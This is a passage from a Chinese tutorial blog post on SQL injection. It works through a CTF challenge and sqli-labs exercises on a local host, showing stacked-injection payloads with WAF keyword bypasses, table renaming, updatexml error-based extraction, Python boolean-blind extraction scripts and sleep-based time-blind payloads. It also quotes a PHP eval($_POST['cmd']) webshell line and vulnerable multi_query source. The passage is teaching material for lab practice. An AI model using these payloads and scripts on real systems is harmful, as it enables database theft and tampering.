表示大小写全匹配，那看来它是不想让你用联合查询注入，我们不妨先试试堆叠注入。我们可以先去 <code>mysql</code> 连接里面自己试试堆叠注入，比如我先实现一个逻辑，这个逻辑仅仅是查询每个数据库的表，那么数据库参数可控，我们就是这么写 <code>sql</code>  语句的：<code>select table_name from information_schema.tables where table_schema=&#39;$input_database&#39;;</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/18.png" alt="18"></p><p>可以看到随便输入一个数据库可以实现功能，那么我们让 <code>$input_database=1&#39;;show databases;--</code>，经过拼接之后形成了：</p><p><code>select table_name from information_schema.tables where table_schema=&#39;1&#39;;show databases;--&#39;;</code>。可以看到我们在参数中输入了其它的 <code>sql</code> 语句。那我们看看结果如何呢？不出意外地执行了我们输入的 <code>show databases</code> 指令。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/19.png" alt="19"></p><p>所以你也就清楚了堆叠注入是怎么一回事，我们试试看，一般题目里面堆叠注入都没有很好的回显，但是这题它有，至于为什么能有我们等会可以分析一下它题目的源码。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/20.png" alt="20"></p><p>再通过 <code>show tables</code> 我们可以发现有两张表 <code>1919810931114514</code> 和 <code>words</code>。然后我们下一步可以用 <code>show columns from table_name</code> 的方式去显示表中所有的字段名。先看看 <code>words</code> 表，发现有 <code>id</code> 和 <code>data</code> 字段，这里大胆点猜测，我们应该是根据 <code>id</code> 去查询 <code>data</code>。它的 <code>sql</code> 语句大概是 <code>select data from supersqli.words where id=&#39;$input_id&#39;</code>。</p><p>这里一个烫芝士注意一下啊，就是当数据库名或表名或列名可能引起歧义的时候，需要使用反引号将其包裹。比如你 <code>select 1,2,3</code> 我并不知道你想找的是 1,2,3 三个数值还是这 1,2,3 是列名。那么为了消除这个歧义我们在这个时候使用反引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `1`,`2`,`3`</span><br></pre></td></tr></table></figure><p>上述写法就是表示 1,2,3 代表列名，反引号在键盘上数字 <code>1</code> 的左边。</p><p>这里因为是全数字，所以我们用反引号才能显示出它所有的列，我们可以看到只有一个 <code>flag</code> 列。那 <code>flag</code> 应该是在里面，我们需要查询出它，这里就可以用到堆叠注入的另一种姿势：预编译。</p><p>我们也先来看看预编译的一般用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=&#x27;show databases&#x27;;</span><br><span class="line">prepare ext from @sql;</span><br><span class="line">execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/21.png" alt="21"></p><p>可以发现它成功执行了 <code>show databases</code>，你可能会觉得一举两得了，但是这对于我们绕过 <code>WAF</code> 还是很有帮助的，它不让出现 <code>select</code> 这个单词的任意大小写形式，我们就用前面的字符串拼接函数 <code>concat</code> 就可以不出现 <code>select</code> 单词但是能执行 <code>select</code> 语句。</p><p>我们还是在这个 <code>cmd</code>  里面去运行。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/22.png" alt="22"></p><p>可以看到，我们利用 <code>concat</code> 函数和预编译的方式在全语句没有出现过 <code>select</code> 的情况下使用了 <code>select</code> 语句才能干的事。</p><p>因为在 <code>php</code> 里面，执行语句的时候才会产生一个进程去执行 <code>sql</code> 语句，语句结束进程也就结束，如果我先 <code>set @sql=&#39;xxx&#39;</code> 那么再次查询不会保存这个变量的结果，这里就需要把多条语句整合成一条，这也是堆叠注入特有的一个优势吧。</p><p>我们的 <code>payload</code> 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p>我们打进去的时候发现 <code>WAF</code> 还有一层检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个很好绕过，因为这个函数它判断大小写的，我们对这两个关键字随便一个字符大写即可绕过，我们最后的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);Prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/23.png" alt="23"></p><p>成功获得 <code>flag</code>。</p><p>堆叠注入还有一个很厉害的姿势就是修改数据库，但是请注意不要删库，因为这样的话你可能就拿不到 <code>flag</code>。如果拿完 <code>flag</code> 再把 <code>flag</code> 删了，如果环境你专用你随便玩，公用的话就容易被别人喷了，万一环境不能重置，那你不是直接没了。</p><p>第二种方式是把装 <code>flag</code> 的表改成本来的逻辑查询的表，也就是 <code>words</code> 表。我们把那个表的名字改成 <code>words</code>，然后它可能是根据 <code>id</code> 查询的，我们就把 <code>flag</code> 列改成 <code>id</code> 也许它是根据 <code>words</code> 查询的，我们到时候改一下就好了。</p><p>先写出我们这几步的 <code>sql</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to `111`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>如果成功的话我们只需要一个万能密码即可查出所有原 <code>flag</code> 表的所有记录。</p><p>我们的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `111`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>执行之后我们使用 <code>1&#39; or 1=1--+</code> 得到 <code>flag</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/24.png" alt="24"></p><p>堆叠注入为什么可以实现，下面就到了我们的源码环节了，没有官方的源码，只是从网上寻找到了差不多类似的，复现出来也基本一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    姿势: &lt;input type=&quot;text&quot; name=&quot;inject&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function waf2($inject) &#123;</span><br><span class="line">    strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) &amp;&amp; die(&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;inject&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;inject&#x27;];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    //多条sql语句</span><br><span class="line">    $sql = &quot;select * from `words` where id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    if ($res)&#123;//使用multi_query()执行一条或多条sql语句</span><br><span class="line">      do&#123;</span><br><span class="line">        if ($rs = $mysqli-&gt;store_result())&#123;//store_result()方法获取第一条sql语句查询结果</span><br><span class="line">          while ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); //关闭结果集</span><br><span class="line">          if ($mysqli-&gt;more_results())&#123;  //判断是否还有更多结果集</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;while($mysqli-&gt;next_result()); //next_result()方法获取下一结果集，返回bool值</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;error &quot;.$mysqli-&gt;errno.&quot; : &quot;.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  //关闭数据库连接</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间的源码环节可以看到它在执行 <code>sql</code> 语句的时候使用了 <code>multi_query</code> 函数，并且会输出所有的结果集。所以这题可以用堆叠注入的原因就在这里，我们可以很轻易地获得多条语句的回显，而在一般情况下是不能的，所以这题就是专门让你用堆叠注入的。</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>我们也来小总结一下堆叠注入：优点当然就是我们可以很轻易地执行多条 <code>sql</code> 语句，但是要求要回显所有的结果集，否则很多信息都是暴不出来的。如果你在普通的题目上使用堆叠注入，那么前面那个 <code>select</code> 就算是空集那它也不会返回第二个结果集的内容，所以这也成为了堆叠注入的局限性。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用一些函数的特性，通过它们的报错把信息泄露出来，当然前提是你可以看到它报错。</p><p>我们前面介绍的有关 <code>xml</code> 的函数都是报错注入常用的函数，我们先来看第一个 <code>updatexml</code> 。至于报错注入是什么呢？我来打个比方，有以下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>已知包含的文件是一个 <code>$flag</code> 变量，标准输出流关闭的情况下如何知道 <code>flag</code> 的值？这么说吧，我们平时的一切正常输出都是标准输出流打印出来的。只有报错信息是标准错误流打印的，如果这里强制让我利用错误流输出，那么可以直接选择 <code>rm($flag)</code>。当它执行的时候这个函数就会报错 <code>xxx not found</code>，这个会通过错误流打印，而这里的 <code>xxx</code> 就是 <code>$flag</code> 变量的值。所以我们会让关键信息执行，然后通过报错使得打印这个关键的信息，因为我们不可能就是让它打印出 <code>$flag not found</code>，这里的 <code>$flag</code> 必须被解析执行成它里面的内容才是对我们有用的。</p><p>在有些情况下，它标准输出流并不能给我们带来什么回显的地方，比如常见的盲注，它标准输出流只会打印 <code>You are in</code> 或者 <code>You are not in</code>。这里如果它显示报错信息，我们同样可以使用报错注入去泄露信息。</p><p>我们看看第一个函数：<code>updatexml(xml,find,replacement)</code>就是一个  <code>xml</code> 替换的函数，这里中间的 <code>find</code> 参数必须使用 <code>Xpath</code> 格式，否则会报错并使用标准错误流打印第二个参数。</p><p>我们来试试看：使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,user(),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/25.png" alt="25"></p><p>可以看到虽然提示错误，但是还是成功打印了我们想要的内容，能报错注入的函数有很多，报错注入也不过多演示了。</p><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>报错注入利用条件和联合查询注入差不多，报错注入需要能看到报错信息，报错信息是一个回显的点，有之后就跟联合查询注入差不多了，把 <code>updatexml</code> 函数第二个参数替换成自己想知道的东西。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>咕咕咕</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>无回显的注入又称为盲注。如果无回显或者回显的内容和数据库的内容没有直接关系，那么这个时候我们只能采用盲注的手段。盲注根据利用手法的不同又分为以下两种</p><ol><li>布尔盲注：如果网站根据有无查找成功，给你返回的有且仅有两个结果。我们的做法一般是，让前面 <code>where</code> 的条件恒为假，再 <code>or</code> 一个自己要判断的语句。或者让前面恒为真，再 <code>and</code> 一个我们要判断的结果，这样的话判断的就是我们想知道的结果了。</li><li>时间盲注：使用一个判断语句，再 <code>and</code> 或 <code>or</code> 一个 <code>sleep</code> 函数，根据是否休眠判断条件是否为真。</li><li>DNSlog盲注：当目标不能打印任何数据库信息，但是可以发起DNS请求的时候可以使用这个方式，这个讲道理不能叫盲注了，因为它能回显数据。</li></ol><p>盲注的特点就是，我一次打过去我最多知道 <code>1bit</code> 的数据，所以盲注手打是非常耗时的，下面我将演示手打和写脚本打。虽然在某些时候 <code>sqlmap</code> 有奇效，但是你得想过，出题人不可能会出一道 <code>sqlmap</code> 能直接跑出答案的题目，所以真材实料还得自己学会。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>我们打开 <code>sqli-labs-lesson5</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/26.png" alt="26"></p><p>可以看到它这里只回显了 <code>You are in</code>，就好比，你登陆成功了，上面不显示你的用户名，只是告诉了你登录成功，否则提示你账号或者密码错误。虽然报错有提示，但是我们不用，主要使用盲注来解决。</p><p>首先我们想知道有什么数据库，我们就象征性打一个数据库 <code>security</code> 下来吧，通过盲注的方式把这个数据库名获取到。</p><p>首先我们确定一下数据库名字多长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5--+</span><br></pre></td></tr></table></figure><p>小于5发现没有回显，我们换成 <code>&lt;8</code>，发现还是没有，再换成 <code>&lt;9</code> 发现有。我们就知道了数据库名长度为 <code>8</code> 了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/27.png" alt="27"></p><p>接下来我们使用 <code>left</code> 函数截取字符串前缀，然后判断，我们一位一位开始判断。最后发现 <code>left(database(),1)=&#39;s&#39;</code> 返回正确结果。于是我们知道了数据库第一个字是 <code>s</code>。然后我们后面再一直这样判断，便能很快知道数据库名了。</p><p>这里为了提升自己，建议自己用 <code>python</code> 写一个脚本来进行盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure><p>我们看看运行结果。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/28.png" alt="28"></p><p>然后写一下跑数据库名称的脚本。这里需要解释一下为什么我们在截取字符的时候为什么要加 <code>ord</code>，因为 <code>mysql</code> 是不区分大小写的，所以直接字符串比较就可能出现 <code>mid(database(),1,1)&lt;&#39;T&#39;</code> 为 <code>true</code> 但是 <code>mid(database(),1,1)&lt;&#39;s&#39;</code> 为 <code>false</code>，这显然不符合二分答案的期望，会导致程序死掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and ord(mid(database(),&#123;0&#125;,1))&lt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br></pre></td></tr></table></figure><p>跑一下也可以看到结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/29.png" alt="29"></p><p>但是我们仍然想知道所有数据库的名称怎么办呢？那就改一下，继续跑，就是会慢一点，这里我们用一个变量统计一下看看它一共请求了多少次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p><p>可以看到注出这些数据库一共请求了 <code>758</code> 次，而且二分算是效率比较高的了，也许你会说我写的也有问题，范围应该限定在 <code>33-127</code>，但是对于二分来说，范围缩小一半也只是少请求一次而已，整个信息长度 <code>94</code>，我们理论上也就会少请求了 <code>94</code> 次。在经过实际测量之后，发现也是要请求 <code>632</code> 次的，所以盲注是不可能去手打的，一定要学会自己写脚本跑，自己会写能应对任何情况，而你如果一味的依靠 <code>sqlmap</code> 最终会发现吃亏的还是自己。</p><p>布尔盲注一般应用在页面无有关数据库内容的回显，报错也无提示，并且只有两种回显的结果的时候用的。比较万金油，但是会导致请求量很大，实际应用的时候如果限制请求次数那么会很难。</p><p>基于时间的盲注</p><p>这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。</p><p>烫芝士：所有语言的特性—逻辑运算与和或都有这么个特性，两个表达式 <code>and</code>，如果第一个表达式为 <code>0</code> 那么不会运算第二个表达式，两个表达式 <code>or</code>，如果第一个表达式为 <code>1</code> 那么不会计算第二个表达式，两个表达式可以扩展到 <code>n</code> 个表达式。</p><p>基于此，我们给出第一个 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 表达式 and sleep(5)--+</span><br></pre></td></tr></table></figure><p>这里可以看到表达式为 <code>1</code> 那么会执行 <code>sleep</code>，如果为 <code>0</code>，那么不会执行。</p><p>我这里写了两个 <code>payload</code>，一个是 <code>1&#39; and length(database())&lt;5 and sleep(5)--+</code> 一个是 <code>1&#39; and length(database())&lt;9 and sleep(5)--+</code>，打开控制台的网络选项，我们可以看到</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png" alt="31"></p><p>前者在 <code>10ms</code> 的时间内就返回了，而后者在 <code>5.02S</code> 才返回。可以看到后面的表达式为真就会休眠 <code>5S</code>，根据返回的时间差来判断表达式是否正确。</p><p>那么我们也来自己写一个脚本来跑跑时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">ss=time.time()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from 